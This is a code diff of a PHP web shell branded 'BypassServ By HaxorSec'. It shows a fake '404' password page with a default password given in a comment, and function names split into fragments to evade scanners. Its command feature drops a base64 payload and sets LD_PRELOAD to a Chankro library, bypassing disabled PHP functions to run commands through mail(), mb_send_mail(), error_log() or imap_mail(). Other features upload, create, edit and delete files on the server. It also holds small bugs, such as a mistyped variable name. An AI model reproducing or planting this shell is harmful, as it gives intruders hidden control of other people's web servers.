@@ -1,44 +1,79 @@
-<?php ?><?php if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
-if (function_exists('session_start')) {
-  session_start();
-  if (!isset($_SESSION['secretyt'])) {
-    $_SESSION['secretyt'] = false;
-  }
-  if (!$_SESSION['secretyt']) {
-    if (isset($_POST['pwdyt']) && md5(md5(md5(md5(md5(md5(md5($_POST['pwdyt']))))))) == '5d965417879d9b90dc5c5246fd1b6153') {
-      $_SESSION['secretyt'] = true;
+<?php
+session_start();
+date_default_timezone_set("Asia/Jakarta");
+
+// Konfigurasi
+$default_action = "FilesMan";
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+
+// Fungsi untuk tampilan halaman login
+function show_login_page($message = "")
+{
+?>
+    <!DOCTYPE html>
+    <html>
+    <!DOCTYPE html>
+    <html lang="en">
+
+    <head>
+        <title>404 Page Not Found</title>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            body {
+                font-family: monospace;
+            }
+
+            input[type="password"] {
+                border: none;
+                border-bottom: 1px solid black;
+                padding: 2px;
+            }
+
+            input[type="password"]:focus {
+                outline: none;
+            }
+
+            input[type="submit"] {
+                border: none;
+                padding: 4.5px 20px;
+                background-color: #2e313d;
+                color: #FFF;
+            }
+        </style>
+    </head>
+
+    <body>
+        <form action="" method="post">
+            <div align="center">
+                <input type="password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value=">">
+            </div>
+        </form>
+    </body>
+
+    </html>
+
+    </html>
+<?php
+    exit;
+}
+
+if (!isset($_SESSION['authenticated'])) {
+    $stored_hashed_password = '$2a$09$CSGBLMb0sybG9bWS/WG1eunz/Lwz3kTsA4g.DOrvY75lJ/vKXw9nG'; // default pass: "admin851"
+
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
+        $_SESSION['authenticated'] = true;
     } else {
-$bytesecform = <<<FORM
-<html>
-  <head>
-    <meta charset="utf-8">
-    <title>404 Not Found</title>
-    <style type="text/css">
-      body {padding:10px}
-      input {
-        padding: 2px;
-        display:inline-block;
-        margin-right: 5px;
-      }
-    </style>
-  </head>
-  <body>
-    <form action="" method="post" accept-charset="utf-8">
-      <input type="password" name="pwdyt" value="" placeholder="passwd">
-      <input type="submit" name="submit" value="submit">
-    </form>
-  </body>
-</html>
-FORM;
-      die($bytesecform);
+        show_login_page();
     }
-  }
 }
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-    <title>HaxSec!?</title>
+    <title>BypassServ By HaxorSec</title>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="robots" content="noindex, nofollow">
@@ -234,11 +269,35 @@ function y($b) {
     $bd = "ba"."se"."64"."_"."de"."co"."de";
     return $bd($b);
 }
+if(function_exists('mail')) {
+    $mail = "<font color='black'>[ mail() :</font><font color='green'> [ ON ]</font> ]";
+} else {
+    $mail = "<font color='black'>[ mail() :</font><font color='red'> [ OFF ]</font> ]";
+}
+if(function_exists('mb_send_mail')) {
+  $mbb = "<font color='black'>[ mb_send_mail() :</font><font color='green'> [ ON ]</font> ]";
+}else{
+   $mbb = "<font color='black'>[ mb_send_mail() :</font><font color='red'> [ OFF ]</font> ]";
+}
+if(function_exists('error_log')) {
+  $errr = "<font color='black'>[ error_log() :</font><font color='green'> [ ON ]</font> ]";
+}else{
+  $errr = "<font color='black'>[ error_log() :</font><font color='red'> [ OFF ]</font> ]";
+}
+if(function_exists('imap_mail')) {
+  $impp = "<font color='black'>[ imap_mail() :</font><font color='green'> [ ON ]</font> ]";
+}else{
+  $impp = "<font color='black'>[ imap_mail() :</font><font color='red'> [ OFF ]</font> ]<br>";
+}
+
+
+
+
 echo "<font color='black'>[ Command Bypas Status Wajib ON MAIL PUTENV @ HaxorSec]</font><br>";
 if (function_exists('mail')) {
-    echo "<font color='black'>[ Function mail() ] :</font><font color='green'> [ ON ]</font><br>";
+    echo $mail." ".$mbb." ".$errr." ".$impp;
 } else {
-    echo "<font color='black'>[ Function mail() ] :<font color='red'> [ OFF ]</font><br>";
+    echo $mail." ".$mbb." ".$errr." ".$impp;
 }
 if (function_exists('putenv')) {
     echo "<font color='black'>[ Function putenv() ] :</font><font color='green'> [ ON ]</font><br>";
@@ -261,23 +320,38 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             echo "<hr>Sorry, there was an error uploading your file.<hr>";
         }
     } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
-        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
-        if (!file_exists($newFolder)) {
-
-            $mek($newFolder);
-            echo '<hr>Folder created successfully!';
-        } else {
-            echo '<hr>Error: Folder already exists!';
+        $ff = $_POST['folder_name'];
+        $newFolder = $currentDirectory . '/' . $ff;
+        if (!file_exists($newfolder)) {
+            if ($mek($newFolder) !== false) {
+                echo '<hr>Folder created successfully!';
+            }else{
+                echo '<hr>Error: Failed to create folder!';
+            }
         }
+
     } elseif (isset($_POST['file_name'])) {
         $fileName = $_POST['file_name'];
         $newFile = $currentDirectory . '/' . $fileName;
         if (!file_exists($newFile)) {
             if ($fpc($newFile, '') !== false) {
-                echo '<hr>File created successfully!';
+                echo '<hr>File created successfully!' . $fileName .' ';
+                $fileToView = $newFile;
+                if (file_exists($fileToView)) {
+                    $fileContent = $fgc($fileToView);
+                    $viewCommandResult = '<hr><p>Result: ' . $fileName . '</p>
+                    <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
+                    <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
+                    <input type="hidden" name="edit_file" value="' . $fileName . '">
+                    <input type="submit" value=" Save "></form></td>';
+                } else {
+                    $viewCommandResult = '<hr><p>Error: File not found!</p>';
+                }
             } else {
                 echo '<hr>Error: Failed to create file!';
             }
+        }else{
+            echo '<hr>Error: File Already Exists!';
         }
     } elseif (isset($_POST['cmd_input'])){
         $p = "p"."u"."t"."e"."n"."v";
@@ -285,7 +359,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $m = "m"."a"."i"."l";
         $base = "ba"."se"."64"."_"."de"."co"."de";
         $en = "ba"."se"."64"."_"."en"."co"."de";
+        $mb = "m"."b"."_"."s"."e"."n"."d"."_"."m"."a"."i"."l";
+        $err = "e"."r"."r"."o"."r"."_"."l"."o"."g";
         $drnm = "d"."i"."r"."n"."a"."m"."e";
+        $imp = "i"."m"."a"."p"."_"."m"."a"."i"."l";
         $currentFilePath = $_SERVER['PHP_SELF'];
         $doc = $_SERVER['DOCUMENT_ROOT'];
         $directoryPath = $drnm($currentFilePath);
@@ -298,7 +375,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $a($full . '/acpid.socket', $base($meterpreter));
         $p('CHANKRO=' . $full . '/acpid.socket');
         $p('LD_PRELOAD=' . $full . '/chankro.so');
-        $m('a','a','a','a');
+        if(function_exists('mail')) {
+            $m('a','a','a','a');
+        } elseif(function_exists('mb_send_mail')) {
+            $mb('a','a','a','a'); 
+        } elseif(function_exists('error_log')) {
+            $err('a',1,'a');
+        } elseif(function_exists('imap_mail')) {
+            $imp('a','a','a');
+        }
+
     }elseif (isset($_POST['delete_file'])) {
         $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
         if (file_exists($fileToDelete)) {
